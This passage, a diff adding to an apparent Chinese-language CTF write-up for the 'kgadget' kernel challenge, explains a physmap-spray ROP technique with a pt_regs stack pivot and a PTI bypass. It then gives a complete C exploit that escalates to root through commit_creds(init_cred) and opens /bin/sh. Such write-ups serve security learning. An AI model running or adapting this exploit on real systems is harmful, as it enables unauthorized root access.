@@ -163,3 +163,127 @@ int __fastcall kgadget_open(inode *__inode, file *__file)
 
 > 这个函数也没用
 
+#二.思路
+
+就是在exp中用`mmap申请大量区域（堆喷）`
+
+并整页整页的布置ROP
+
+然后再在`physmap`区域中随便蒙一个地址(`physmap spary`)
+
+这样很大概率就能蒙到那个`add_rsp_a0_pop_rbx_r12_r13_rbp_ret`
+
+那么`rsp`是怎么跳到`mmap`页内执行ROP的呢？
+
+在内核栈的最高端有一个`pt_regs结构体 `，驱动被调用时，内核栈只有一页，`rsp`与它的距离不远
+
+利用这个`gadget`偏移到`pt_regs`内跳到`r9 = pop rsp ; ret`，`r8 = try_hit`
+
+```1
+for(;idx < (page_size/8 - 0x30);idx++){
+        rop[idx]=add_rsp_a0_pop_rbx_r12_r13_rbp_ret;
+    }
+```
+
+保证了`rsp`的步长
+
+```2
+for(;idx < (page_size/8 - 0x10);idx++){
+        rop[idx]=ret;
+    }
+```
+
+在这里布置`ret`区域防止`rsp`掠过真`ROP链`
+
+最后由于题目开启了`pti = on`导致手搓的`swaps ; iretq`没切`CR3`
+
+必须用内部函数把`CR3页表`切回用户态才行
+
+# 三.Exploit
+
+```c
+#include <stdio.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <string.h>
+
+size_t commit_creds = 0xffffffff810c92e0;
+size_t init_cred =  0xffffffff82a6b700;
+size_t pop_rdi = 0xffffffff8108c6f0;
+size_t add_rsp_a0_pop_rbx_r12_r13_rbp_ret = 0xffffffff810737fe;
+size_t pop_rsp = 0xffffffff811483d0;
+size_t ret = 0xffffffff810001fc;
+size_t return_to_usermode = 0xffffffff81c00fb0  + 27;
+size_t iretq = 0xffffffff810002df;
+size_t user_cs,user_rflags,user_sp,user_ss;
+int dev_fd;
+size_t page_size;    
+size_t try_hit;
+size_t *physmap_spray_array[16000];
+
+void save_stats(){
+    __asm__(
+        "mov user_cs,cs;"
+        "mov user_ss,ss;"
+        "mov user_sp,rsp;"
+        "pushf;"
+        "pop user_rflags;"
+        );
+}
+
+void get_shell(){
+    write(1, "entered\n", 8);
+    if(getuid()){
+        exit(EXIT_FAILURE);
+    }
+    write(1,"root!\n",6);
+    system("/bin/sh");
+    exit(EXIT_SUCCESS);
+}
+
+void ConstructRopchian(size_t* rop){
+    int idx = 0;
+    for(;idx < (page_size/8 - 0x30);idx++){
+        rop[idx]=add_rsp_a0_pop_rbx_r12_r13_rbp_ret;
+    }
+    for(;idx < (page_size/8 - 0x10);idx++){
+        rop[idx]=ret;
+    }
+    rop[idx++]=pop_rdi;
+    rop[idx++]=init_cred;
+    rop[idx++]=commit_creds;
+    rop[idx++]=return_to_usermode;
+    rop[idx++]=*(size_t*)"Mixt";
+    rop[idx++]=*(size_t*)"Mixt";
+    rop[idx++]=(size_t)get_shell;
+    rop[idx++]=user_cs;
+    rop[idx++]=user_rflags;
+    rop[idx++]=user_sp + 8;
+    rop[idx++]=user_ss;
+}
+
+int main(int argc,char **argv){
+    save_stats();
+    dev_fd = open("/dev/kgadget",O_RDWR);
+    page_size = sysconf(_SC_PAGESIZE);
+    physmap_spray_array[0]=mmap(NULL,page_size,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    ConstructRopchian(physmap_spray_array[0]);
+    for(int i = 1;i< 15000;i++){
+        physmap_spray_array[i]=mmap(NULL,page_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, -1 ,0);
+        memcpy(physmap_spray_array[i],physmap_spray_array[0],page_size);
+    }
+    try_hit = 0xffff888000000000 + 0x7000000;
+    __asm__(
+        "mov r8, try_hit;"
+        "mov r9, pop_rsp;"
+        "mov rax, 0x10;"
+        "mov rdx, try_hit;"
+        "mov rsi, 0x1bf52;"
+        "mov rdi, dev_fd;"
+        "syscall;"
+        );
+}```
+
+
